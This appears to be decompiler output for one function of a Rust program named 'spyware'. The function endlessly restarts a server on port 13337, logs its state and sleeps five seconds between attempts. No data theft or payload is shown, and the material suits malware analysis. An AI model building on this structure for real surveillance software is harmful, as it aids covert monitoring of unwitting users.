fn spyware::run_server_loop() -> void {
    let v0: u64;  // [bp-0xb8]
    let v1: struct40;  // [bp-0xb0]
    let v2: u64;  // [bp-0x88]
    let v3: u64;  // [bp-0x80]
    let v4: u64;  // [bp-0x78]
    let v5: i64;  // [bp-0x70], Other Possible Types: u64
    let v6: u128;  // [bp-0x68]
    let v7: u64;  // [bp-0x68]
    let v8: void*;  // [bp-0x60]
    let v9: i64;  // [bp-0x50]
    let v10: u64;  // [bp-0x48]
    let v11: i64;  // [bp-0x40]
    let v12: u64;  // [bp-0x38]
    let v13: u64;  // [bp-0x30]
    let v14: u64;  // [bp-0x28]
    let v15: u64;  // [bp-0x20]
    let v16: u64;  // [bp-0x18]
    let v17: u64;  // [bp-0x10]
    let v19: u64;  // r15
    let v20: u64;  // r14
    let v21: u64;  // r13
    let v22: u64;  // r12
    let v23: u64;  // rbx
    let v24: u64;  // rax

    v17 = v19;
    v16 = v20;
    v15 = v21;
    v14 = v22;
    v13 = v23;
    loop {
        if core::sync::atomic::atomic_load() < 4 {
            v24 = spyware::communication::server::run_server(13337);
            if !v24 {
                goto LABEL_451a65;
            }
        } else {
            v3 = "Running server loop";
            v4 = 1;
            v5 = 8;
            v6 = 0;
            v1 = struct40 {
                field_0: "spyware"
                field_16: "spyware"
                field_32: log::__private_api::loc("src/main.rs")
            };
            log::__private_api::log(&v3, 4, &v1);
            v24 = spyware::communication::server::run_server(13337);
            if !v24 {
                goto LABEL_451a65;
            }
        }
        v2 = v24;
        if core::sync::atomic::atomic_load() {
            v0 = 5;
            v9 = &v2;
            v10 = <std::io::error::Error as core::fmt::Display>::fmt;
            v11 = &v0;
            v12 = core::fmt::num::imp::<impl core::fmt::Display for u64>::fmt;
            v3 = "Error ";
            v4 = 3;
            v8 = 0;
            v5 = &v9;
            v7 = 2;
            v1 = struct40 {
                field_0: "spyware"
                field_16: "spyware"
                field_32: log::__private_api::loc("src/main.rs")
            };
            log::__private_api::log(&v3, 1, &v1);
        }
LABEL_451a65:
        if core::sync::atomic::atomic_load() >= 4 {
            v0 = 5;
            v9 = &v0;
            v10 = core::fmt::num::imp::<impl core::fmt::Display for u64>::fmt;
            v3 = "Sleeping ";
            v4 = 2;
            v8 = 0;
            v5 = &v9;
            v7 = 1;
            v1 = struct40 {
                field_0: "spyware"
                field_16: "spyware"
                field_32: log::__private_api::loc("src/main.rs")
            };
            log::__private_api::log(&v3, 4, &v1);
        }
        std::thread::sleep(5, 0);
    }
}
